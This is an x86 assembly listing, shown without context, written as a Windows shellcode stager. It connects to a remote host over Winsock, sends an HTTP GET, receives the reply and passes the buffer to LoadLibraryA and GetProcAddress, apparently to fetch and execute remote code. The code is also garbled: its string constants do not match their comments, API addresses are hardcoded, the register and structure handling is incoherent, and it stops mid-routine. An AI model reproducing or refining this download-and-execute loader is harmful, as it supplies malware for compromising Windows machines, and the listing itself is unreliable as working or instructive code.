global _start

section .text

_start:
    ; Initialize Winsock library
    push 0x0202             ; push version 2.2
    pop eax                 ; pop into eax
    push eax                ; push onto stack
    push ebx                ; push protocol (0)
    mov ecx, esp            ; set pointer to WSADATA structure
    push ebx                ; push flags (0)
    push 0x01               ; push action (WSAStartup)
    mov eax, 0x2b5acf29     ; move Ws2_32.WSAStartup into eax
    call eax                ; call WSAStartup

    ; Create socket
    push ebx                ; push protocol (0)
    push 0x01               ; push type (SOCK_STREAM)
    push 0x02               ; push address family (AF_INET)
    mov ecx, esp            ; set pointer to sockaddr_in structure
    mov eax, 0x2b5ad1d1     ; move Ws2_32.socket into eax
    call eax                ; call socket

    ; Resolve IP address
    push dword 0x636c6162   ; push "bacl" (in little-endian)
    push dword 0x2e777777   ; push "www." (in little-endian)
    push dword 0x726f6f74   ; push "tor" (in little-endian)
    push dword 0x68b60200   ; push port 443 and AF_INET (in little-endian)
    mov ecx, esp            ; set pointer to struct sockaddr
    push ebx                ; push 0 (flags)
    push dword 0x10         ; push size of struct sockaddr
    push ecx                ; push pointer to struct sockaddr
    push ebx                ; push socket
    mov eax, 0x2b5ad0c9     ; move Ws2_32.connect into eax
    call eax                ; call connect

    ; Send HTTP GET request
    push dword 0x20746e65   ; push "en t" (in little-endian)
    push dword 0x74732067   ; push "g st" (in little-endian)
    push dword 0x2f2f7777   ; push "//ww" (in little-endian)
    push dword 0x2e656c62   ; push "ble." (in little-endian)
    push dword 0x632e6f72   ; push "roc." (in little-endian)
    push dword 0x702f6e69   ; push "in/p" (in little-endian)
    push dword 0x6568702f   ; push "/phe" (in little-endian)
    push dword 0x646e6f77   ; push "won" (in little-endian)
    push dword 0x20544547   ; push "GET " (in little-endian)
    mov ecx, esp            ; set pointer to request
    push dword 0x00         ; push 0 (flags)
    push dword 0x3b         ; push size of request
    push ecx                ; push pointer to request
    push ebx                ; push socket
    mov eax, 0x2b5ad00d     ; move Ws2_32.send into eax
    call eax                ; call send
    ; Receive HTTP response
    push 0x400              ; push buffer size
    lea ecx, [esp-0x400+0x8] ; set pointer to buffer
    push ecx                ; push pointer to buffer
    push ebx                ; push socket
    mov eax, 0x2b5ad008     ; move Ws2_32.recv into eax
    call eax                ; call recv

    ; Load library
    push ecx                ; push pointer to buffer
    xor edx, edx            ; set edx to 0
    push edx                ; push 0 (hModule)
    mov eax, 0x7c801d7b     ; move LoadLibraryA into eax
    call eax                ; call LoadLibraryA
    mov ebx, eax            ; save handle to library in ebx

    ; Get function address
    push dword 0x6578652e   ; push "exe." (in little-endian)
    push dword 0x6d657473   ; push "stem" (in little-endian)
    push ebx                ; push handle to library
    mov eax, 0x7c801d73     ; move GetProcAddress into eax
    call eax                ; call GetProcAddress
    mov ecx, eax            ; save pointer to function in ecx

    ; Call function
    push edx                ; push 0 (lpThreadAttributes)
    push edx                ; push 0 (dwStackSize)
    push ecx                ; push pointer to function
    push ecx                ; push pointer to function
    push edx                ; push 0 (dwCreationFlags)
    call ebx                ; call function

    ; Exit process
    push 0x00               ; push exit code
